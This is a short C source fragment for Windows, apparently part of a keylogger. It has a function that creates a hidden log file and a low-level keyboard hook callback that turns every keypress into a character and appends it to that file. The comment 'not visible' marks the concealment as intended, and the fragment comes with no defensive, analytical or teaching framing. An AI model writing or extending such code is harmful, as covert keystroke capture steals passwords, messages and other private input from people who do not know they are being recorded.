void initKeylog() {
    // Ensure the log file exists and is not visible
    FILE *file = fopen(LOG_FILE, "a");
    if (file) {
        fclose(file);
        SetFileAttributes(LOG_FILE, FILE_ATTRIBUTE_HIDDEN);
    }
}

LRESULT CALLBACK hookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        BYTE kbState[256];
        GetKeyboardState(kbState);

        SHORT vkCode = kb->vkCode;
        WCHAR unicodeChar;

        if (ToUnicode(vkCode, kb->scanCode, kbState, &unicodeChar, 1, 0) > 0) {
            // Write the character to the log file
            HANDLE hFile = CreateFile(LOG_FILE, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD dwBytesWritten;
                SetFilePointer(hFile, 0, NULL, FILE_END);
                WriteFile(hFile, &unicodeChar, sizeof(unicodeChar), &dwBytesWritten, NULL);
                CloseHandle(hFile);
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

